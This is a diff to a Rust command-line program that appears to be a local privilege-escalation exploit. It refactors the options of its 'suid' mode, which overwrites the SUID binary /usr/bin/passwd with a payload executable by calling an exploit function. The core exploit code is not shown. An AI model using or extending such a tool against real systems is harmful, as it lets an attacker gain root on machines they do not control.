@@ -26,14 +26,6 @@ struct Opt {
     /// Offset to begin overwriting.
     #[structopt(short = "b", long)]
     offset: Option<i64>,
-
-    /// Target SUID file to overwrite.
-    #[structopt(short = "t", long)]
-    target_suid: Option<PathBuf>,
-
-    /// SUID payload executable
-    #[structopt(short = "s", long)]
-    suid_payload: Option<PathBuf>,
 }
 
 fn main() -> Result<(), anyhow::Error> {
@@ -61,8 +53,8 @@ fn main() -> Result<(), anyhow::Error> {
         }
 
         "suid" => {
-            let suid_payload = opt.suid_payload.unwrap_or(PathBuf::from("./suid"));
-            let target_suid = opt.target_suid.unwrap_or(PathBuf::from("/usr/bin/passwd"));
+            let suid_payload = opt.input.unwrap_or(PathBuf::from("./suid"));
+            let target_suid = opt.output.unwrap_or(PathBuf::from("/usr/bin/passwd"));
 
             // Ensure payload exists.
             if !Path::new(&suid_payload).exists() {
@@ -77,7 +69,7 @@ fn main() -> Result<(), anyhow::Error> {
             }
 
             helpers::backup_file(&PathBuf::from("/usr/bin/passwd")).unwrap();
-            return exploit::exploit("./suid".into(), "/usr/bin/passwd".into(), 0);
+            return exploit::exploit(suid_payload, target_suid.into(), 0);
         }
 
         _ => {
